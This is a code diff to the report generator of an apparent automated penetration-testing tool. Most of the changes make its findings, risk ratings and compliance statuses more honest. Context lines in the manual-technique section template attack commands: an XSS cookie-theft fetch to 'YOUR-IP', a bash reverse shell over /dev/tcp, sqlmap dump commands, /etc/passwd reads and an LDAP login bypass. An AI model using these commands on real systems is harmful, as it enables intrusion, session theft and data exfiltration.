@@ -372,7 +372,20 @@ class ReportGenerator:
 
     def __init__(self):
         self.logger = logging.getLogger(__name__)
-    
+
+    #: Discovery keys whose presence proves the recon phase ran.  An empty
+    #: dict means the mode never invoked discovery (e.g. ``-m vuln``) - the
+    #: report must say "not scanned", never "none detected".
+    DISCOVERY_KEYS = ('urls', 'subdomains', 'ports', 'technologies',
+                      'technologies_with_confidence', 'admin_panels',
+                      'login_forms')
+
+    @classmethod
+    def _discovery_ran(cls, discovery: Any) -> bool:
+        if not isinstance(discovery, dict):
+            return False
+        return any(k in discovery for k in cls.DISCOVERY_KEYS)
+
     def generate_comprehensive_report(self, results: Dict[str, Any]) -> Dict[str, Any]:
         """Generate comprehensive penetration test report with professional auditor focus."""
         # Filter and deduplicate vulnerabilities
@@ -398,7 +411,13 @@ class ReportGenerator:
             vulns_by_type[vtype].append(v)
 
         # Deduplicate exploitation results
-        unique_exploits = self._deduplicate_exploitation_results(results.get('exploitation', []))
+        exploitation_attempts = list(results.get('exploitation') or [])
+        unique_exploits = self._deduplicate_exploitation_results(exploitation_attempts)
+        exploit_counts = {'confirmed': 0, 'possible': 0, 'inconclusive': 0}
+        for attempt in exploitation_attempts:
+            key = str(attempt.get('status', '')).lower() if isinstance(attempt, dict) else ''
+            if key in exploit_counts:
+                exploit_counts[key] += 1
         
         # Generate detailed analysis
         vulnerability_details = self._generate_vulnerability_details(filtered_vulns)
@@ -413,15 +432,23 @@ class ReportGenerator:
         if not registry:
             registry = [
                 {
-                    'id': '',
-                    'title': '%s at %s' % (v.get('type', 'finding'),
-                                           v.get('url', ''))[:140],
+                    'id': v.get('id') or f'find-{idx:03d}',
+                    'title': ('%s at %s' % (v.get('type', 'finding'),
+                                            v.get('url', '')))[:140],
+                    'type': str(v.get('type', '')),
+                    'url': str(v.get('url', '')),
                     'severity': str(v.get('severity', 'INFO')).upper(),
                     'state': str(v.get('state', 'discovered')),
                     'affected_asset': str(v.get('url', '')),
-                    'confidence': v.get('confidence', 0.0),
+                    'confidence': v.get('confidence'),
+                    'verified': bool(v.get('verified')),
+                    'verification': (
+                        str((v.get('verification') or {}).get('status', ''))
+                        if isinstance(v.get('verification'), dict) else ''),
+                    'has_evidence': (isinstance(v.get('evidence'), dict)
+                                     and bool(v.get('evidence'))),
                 }
-                for v in filtered_vulns
+                for idx, v in enumerate(filtered_vulns, 1)
             ]
 
         summary = {
@@ -440,7 +467,12 @@ class ReportGenerator:
                 'technologies': len(discovery.get('technologies', []))
             },
             'successful_demonstrations': len(unique_exploits),
-            'risk_rating': self._calculate_overall_risk(critical_vulns, high_vulns),
+            'exploitation_attempted': len(exploitation_attempts),
+            'exploitation_confirmed': exploit_counts['confirmed'],
+            'exploitation_possible': exploit_counts['possible'],
+            'exploitation_inconclusive': exploit_counts['inconclusive'],
+            'risk_rating': self._calculate_overall_risk(
+                critical_vulns, high_vulns, medium_vulns),
             'raw_finding_count': len(all_vulns),
             'unique_finding_count': len(deduped_vulns),
         }
@@ -465,6 +497,7 @@ class ReportGenerator:
                 'executive_summary': self._generate_executive_summary(critical_vulns, high_vulns, medium_vulns, unique_exploits, no_findings=no_findings),
                 'audit_summary': summary,
                 'discovery_findings': {
+                    'ran': self._discovery_ran(discovery),
                     'technologies': discovery.get('technologies', []),
                     'technologies_with_confidence': discovery.get('technologies_with_confidence', []),
                     'open_ports': discovery.get('ports', []),
@@ -477,8 +510,10 @@ class ReportGenerator:
                 'tech_stack_hardening': self.generate_tech_suggestions(discovery.get('technologies', []), discovery.get('technologies_with_confidence', [])),
                 'cve_intelligence': self.generate_cve_lookup(discovery.get('technologies', []), discovery.get('technologies_with_confidence', [])),
                 'cve_mapping': results.get('cve_mapping', []),
+                'external_tools': results.get('external_tools', []),
                 'detailed_analysis': vulnerability_details,
                 'demonstrated_impact': unique_exploits,
+                'exploitation_attempts': exploitation_attempts,
                 'bruteforce_findings': self._summarize_bruteforce(results.get('bruteforce', {})),
                 'service_enumeration': self._summarize_enumeration(results.get('enumeration', {})),
                 'ai_assistant': self._summarize_ai(results.get('ai_analysis', {})),
@@ -622,13 +657,20 @@ class ReportGenerator:
             })
         return result
 
-    def _calculate_overall_risk(self, critical: List, high: List) -> str:
-        """Calculate overall risk level."""
+    def _calculate_overall_risk(self, critical: List, high: List,
+                                medium: List = None) -> str:
+        """Calculate overall risk level.
+
+        Medium findings count: a stack of MEDIUMs (missing headers,
+        directory listings, ...) is a MEDIUM risk, not LOW.
+        """
         if len(critical) > 0:
             return 'CRITICAL'
         elif len(high) > 3:
             return 'HIGH'
         elif len(high) > 0:
+            return 'MEDIUM'
+        elif medium and len(medium) > 0:
             return 'MEDIUM'
         else:
             return 'LOW'
@@ -678,26 +720,82 @@ class ReportGenerator:
         issue_map = {
             'SQL Injection': ('CRITICAL', 'Use parameterized queries or prepared statements. Disable detailed database error messages.'),
             'XSS': ('HIGH', 'Implement proper output encoding and Content Security Policy (CSP).'),
+            'Cross-Site Scripting': ('HIGH',
+                                     'Implement proper output encoding and '
+                                     'Content Security Policy (CSP). Encode '
+                                     'user-controlled output in HTML, '
+                                     'attribute, and JavaScript contexts.'),
             'Command Injection': ('CRITICAL', 'Avoid passing user input to system shells. Use allowlists for command arguments.'),
             'File Inclusion': ('CRITICAL', 'Validate file paths against an allowlist and use filesystem root restrictions.'),
             'Authentication': ('CRITICAL', 'Implement MFA and strong password policies. Review session management.'),
             'SSRF': ('CRITICAL', 'Whitelist allowed egress domains and sanitize URL inputs.'),
-            'XXE': ('CRITICAL', 'Disable external entity and DTD processing in XML parsers.')
+            'XXE': ('CRITICAL', 'Disable external entity and DTD processing in XML parsers.'),
+            'Directory Listing': ('MEDIUM',
+                                  'Disable directory indexes on the web '
+                                  'server (e.g. "Options -Indexes"). Remove '
+                                  'or protect backup/archive files exposed '
+                                  'through listings.'),
+            'Missing Security Headers': ('MEDIUM',
+                                         'Send X-Frame-Options (or '
+                                         'frame-ancestors), '
+                                         'X-Content-Type-Options: nosniff, a '
+                                         'Content-Security-Policy, '
+                                         'Strict-Transport-Security, and '
+                                         'Referrer-Policy on every response.'),
+            'Sensitive Comment': ('LOW',
+                                  'Strip development comments, internal '
+                                  'paths, and debug notes from production '
+                                  'HTML/JS before deploying.'),
+            'Open Redirect': ('MEDIUM',
+                              'Validate redirect targets against an allowlist '
+                              'of same-origin paths; never redirect to raw '
+                              'user-supplied URLs.'),
+            'HTTP Method': ('MEDIUM',
+                            'Disable unneeded methods (PUT, DELETE, TRACE, '
+                            'OPTIONS where unused) at the server or WAF '
+                            'layer.'),
+            'CORS': ('MEDIUM',
+                     'Restrict Access-Control-Allow-Origin to trusted '
+                     'origins; never reflect arbitrary origins with '
+                     'credentials allowed.'),
+            'Backup': ('HIGH',
+                       'Remove backup/archive files (.old, .bak, .zip, .sql) '
+                       'from web roots or deny access to them; they often '
+                       'contain source and credentials.'),
+            'Subdomain Takeover': ('HIGH', 'Remove dangling DNS records pointing at unclaimed external services, or reclaim the service.'),
+            'Cookie': ('LOW', 'Set Secure, HttpOnly, and SameSite=Lax (or Strict) on session cookies.'),
         }
-        
+        timeline_map = {'CRITICAL': 'Immediate', 'HIGH': 'Urgent',
+                        'MEDIUM': 'Scheduled', 'LOW': 'Scheduled', 'INFO': 'Scheduled'}
+
         added_types = set()
         for vuln in vulnerabilities:
             vtype = vuln.get('type', '')
+            matched = False
             for key, (sev, rec) in issue_map.items():
                 if key in vtype and key not in added_types:
                     recommendations.append({
                         'issue': key,
                         'severity': sev,
                         'recommendation': rec,
-                        'timeline': 'Immediate' if sev == 'CRITICAL' else 'Urgent'
+                        'timeline': timeline_map.get(sev, 'Scheduled')
                     })
                     added_types.add(key)
-        
+                    matched = True
+            # Never fall back to a single generic line while real findings
+            # exist: each unmapped type gets its own actionable entry.
+            if not matched and vtype and vtype not in added_types:
+                sev = str(vuln.get('severity', 'MEDIUM')).upper()
+                recommendations.append({
+                    'issue': vtype,
+                    'severity': sev,
+                    'recommendation': ('Investigate this finding against vendor '
+                                       'guidance, apply the fix, and re-test to '
+                                       'confirm remediation.'),
+                    'timeline': timeline_map.get(sev, 'Scheduled')
+                })
+                added_types.add(vtype)
+
         if not recommendations:
             recommendations.append({
                 'issue': 'General Hardening',
@@ -1161,17 +1259,24 @@ class ReportGenerator:
                     'tools': kb['tools'],
                     'assets_affected': [],
                     'severity': vuln.get('severity', 'UNKNOWN'),
-                    'confirmed_findings': []  # Track individual confirmed findings
+                    # Per-URL scanner rows.  Despite the historical key name,
+                    # these are observations until verification says otherwise.
+                    'confirmed_findings': []
                 }
 
             if confirmed_url and confirmed_url not in details[vtype]['assets_affected']:
                 details[vtype]['assets_affected'].append(confirmed_url)
-            
-            # Track each confirmed finding with its URL and payload
+
+            verification = vuln.get('verification')
+            vstatus = (str(verification.get('status') or '')
+                       if isinstance(verification, dict) else '')
+            verified = bool(vuln.get('verified')) or vstatus.lower() in (
+                'confirmed', 'success')
             details[vtype]['confirmed_findings'].append({
                 'url': confirmed_url,
                 'payload': payload,
-                'description': vuln.get('description', '')
+                'description': vuln.get('description', ''),
+                'verified': verified,
             })
 
         return details
@@ -1180,13 +1285,14 @@ class ReportGenerator:
     def _verification_lines(verification: Optional[Dict]) -> List[str]:
         """Markdown lines for Athena's automated verification evidence.
 
-        Only ``confirmed`` / ``possible`` results qualify: an inconclusive
-        attempt is not evidence and must not be presented as such.
+        Only a *confirmed* result qualifies.  ``possible`` and ``inconclusive``
+        attempts are not proof, and the operator-facing manual steps built on
+        top of this must never be framed as verified.
         """
         if not isinstance(verification, dict):
             return []
         status = str(verification.get('status') or '').strip()
-        if status.lower() not in ('confirmed', 'possible'):
+        if status.lower() not in ('confirmed', 'success'):
             return []
 
         lines = [f"**Automated verification (Athena):** {status.upper()}"]
@@ -1218,9 +1324,9 @@ class ReportGenerator:
         
         # Generate specific commands based on vulnerability type
         if 'SQL Injection' in vtype:
-            techniques.append(f"**Confirmed URL:** `{url}`")
+            techniques.append(f"**Target URL:** `{url}`")
             if payload:
-                techniques.append(f"**Working payload:** `{payload}`")
+                techniques.append(f"**Detected payload:** `{payload}`")
                 techniques.append(f"**Manual test:** Open `{url}` in browser or Burp Suite to verify the injection point")
                 techniques.append(f"**sqlmap command:** `sqlmap -u \"{url}\" --batch --dbs --dump`")
                 techniques.append(f"**Extract databases:** `sqlmap -u \"{url}\" --batch --dbs`")
@@ -1229,62 +1335,62 @@ class ReportGenerator:
                 techniques.append(f"**Test with:** `sqlmap -u \"{base_url}{path}?id=1\" --batch --dbs`")
         
         elif 'SSRF' in vtype:
-            techniques.append(f"**Confirmed URL:** `{url}`")
+            techniques.append(f"**Target URL:** `{url}`")
             if payload:
-                techniques.append(f"**Working payload:** `{payload}`")
+                techniques.append(f"**Detected payload:** `{payload}`")
                 techniques.append(f"**Verify with curl:** `curl -v \"{url}\"`")
                 techniques.append(f"**Cloud metadata test:** `curl -v \"{base_url}{path}?{list(params.keys())[0] if params else 'url'}=http://169.254.169.254/latest/meta-data/\"`")
             else:
                 techniques.append(f"**Test with:** `curl -v \"{base_url}{path}?url=http://127.0.0.1\"`")
         
         elif 'XSS' in vtype:
-            techniques.append(f"**Confirmed URL:** `{url}`")
+            techniques.append(f"**Target URL:** `{url}`")
             if payload:
-                techniques.append(f"**Working payload:** `{payload}`")
+                techniques.append(f"**Detected payload:** `{payload}`")
                 techniques.append(f"**Cookie theft:** Inject `<script>fetch(\"http://YOUR-IP/c?c=\"+document.cookie)</script>`")
                 techniques.append(f"**Session hijack:** `curl -H \"Cookie: session=STOLEN\" {url}`")
         
         elif 'LFI' in vtype or 'Path Traversal' in vtype:
-            techniques.append(f"**Confirmed URL:** `{url}`")
+            techniques.append(f"**Target URL:** `{url}`")
             if payload:
-                techniques.append(f"**Working payload:** `{payload}`")
+                techniques.append(f"**Detected payload:** `{payload}`")
                 techniques.append(f"**Read passwd:** `curl \"{base_url}{path}?{list(params.keys())[0] if params else 'page'}=../../../../etc/passwd\"`")
                 techniques.append(f"**PHP source:** `curl \"{base_url}{path}?{list(params.keys())[0] if params else 'page'}=php://filter/convert.base64-encode/resource=config.php\"`")
         
         elif 'Command Injection' in vtype:
-            techniques.append(f"**Confirmed URL:** `{url}`")
+            techniques.append(f"**Target URL:** `{url}`")
             if payload:
-                techniques.append(f"**Working payload:** `{payload}`")
+                techniques.append(f"**Detected payload:** `{payload}`")
                 techniques.append(f"**Verify:** `curl \"{url}\"`")
                 techniques.append(f"**Reverse shell:** `; bash -i >& /dev/tcp/YOUR-IP/4444 0>&1`")
         
         elif 'XXE' in vtype:
-            techniques.append(f"**Confirmed URL:** `{url}`")
+            techniques.append(f"**Target URL:** `{url}`")
             if payload:
-                techniques.append(f"**Working payload:** `{payload}`")
+                techniques.append(f"**Detected payload:** `{payload}`")
                 techniques.append(f"**Extract files:** Send POST with `<!DOCTYPE x [<!ENTITY f SYSTEM \"file:///etc/passwd\">]>`")
         
         elif 'CRLF Injection' in vtype:
-            techniques.append(f"**Confirmed URL:** `{url}`")
+            techniques.append(f"**Target URL:** `{url}`")
             if payload:
-                techniques.append(f"**Working payload:** `{payload}`")
+                techniques.append(f"**Detected payload:** `{payload}`")
                 techniques.append(f"**Header injection:** `curl -v \"{base_url}{path}?{list(params.keys())[0] if params else 'url'}=%0d%0aSet-Cookie:%20admin=true\"`")
         
         elif 'Open Redirect' in vtype:
-            techniques.append(f"**Confirmed URL:** `{url}`")
+            techniques.append(f"**Target URL:** `{url}`")
             if payload:
-                techniques.append(f"**Working payload:** `{payload}`")
+                techniques.append(f"**Detected payload:** `{payload}`")
                 techniques.append(f"**OAuth theft:** `https://target.com{path}?redirect=https://attacker.com/`")
         
         elif 'CSRF' in vtype:
-            techniques.append(f"**Confirmed URL:** `{url}`")
+            techniques.append(f"**Target URL:** `{url}`")
             techniques.append(f"**Exploit:** Create a malicious page with auto-submitting form targeting this URL")
             techniques.append(f"**Test with:** Burp Suite -> Intruder -> Repeater")
         
         elif 'LDAP Injection' in vtype:
-            techniques.append(f"**Confirmed URL:** `{url}`")
+            techniques.append(f"**Target URL:** `{url}`")
             if payload:
-                techniques.append(f"**Working payload:** `{payload}`")
+                techniques.append(f"**Detected payload:** `{payload}`")
                 techniques.append(f"**Bypass auth:** Inject `*)(uid=*))(|(uid=*` to bypass login")
         
         else:
@@ -1316,12 +1422,16 @@ class ReportGenerator:
 
         return {
             'gdpr_assessment': {
-                'status': 'NON-COMPLIANT' if gdpr_issues else 'REVIEW_REQUIRED',
-                'findings': list(set(gdpr_issues)) or ["No high-priority GDPR violations immediately identified."]
+                'status': 'NON-COMPLIANT' if gdpr_issues else 'NOT_ASSESSED',
+                'findings': (list(set(gdpr_issues)) or [
+                    'No GDPR-relevant issues detected by automated checks; '
+                    'a manual compliance assessment is still required.'])
             },
             'pci_dss_assessment': {
-                'status': 'FAIL' if pci_issues else 'PASS_WITH_RESERVATIONS',
-                'findings': list(set(pci_issues)) or ["Vulnerability scan meets basic requirement standard."]
+                'status': 'FAIL' if pci_issues else 'NOT_ASSESSED',
+                'findings': (list(set(pci_issues)) or [
+                    'No PCI DSS-relevant issues detected by automated checks; '
+                    'a manual compliance assessment is still required.'])
             }
         }
 
